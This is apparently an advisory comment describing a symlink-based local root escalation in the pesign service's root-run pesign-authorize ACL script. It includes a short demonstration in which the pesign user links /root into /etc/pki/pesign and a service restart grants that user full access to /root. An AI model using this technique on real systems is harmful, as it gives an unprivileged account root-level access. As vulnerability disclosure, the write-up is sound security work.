I would like to add some more details about the vulnerability:

The project ships a systemd service file that starts a pesign daemon
instance but also runs a StartPost script:

```
ExecStart=/usr/bin/pesign --daemonize
ExecStartPost=/usr/libexec/pesign/pesign-authorize
```

This pesign-authorize script is run with root privileges and grants a
dynamic list of users and groups recursively full access to
/etc/pki/pesign*/ and /run/pesign via POSIX access control lists.

The list of users is found in the root controlled files
/etc/pesign/users and /etc/pesign/groups. By default only pesign:pesign
are configured.

# The Vulnerability

Since the pesign-authorize script is run at every start of the pesign
service unit, the directory trees /etc/pki/pesign* and /run/pesign will
already be controlled by the unprivileged pesign:pesign user and group.
The script does not take precautions to prevent symlink attacks being
staged by a compromised unprivileged user account.

A simple demonstration of the attack would be this:

```
root# sudo -u pesign -g pesign ln -s /root /etc/pki/pesign/attack
root# systemctl restart pesign
root# getfactl /root
# file: root/
# owner: root
# group: root
user::rwx
user:pesign:rwx
group::---
group:pesign:rwx
mask::rwx
other::---
```

Therefore in a default configuration of pesign there is a local pesign
user or pesign group to root escalation that can be achieved at every
pesign.service unit start.

I reproduced this on Fedora 35 using pesign version 113 release 18.fc35.
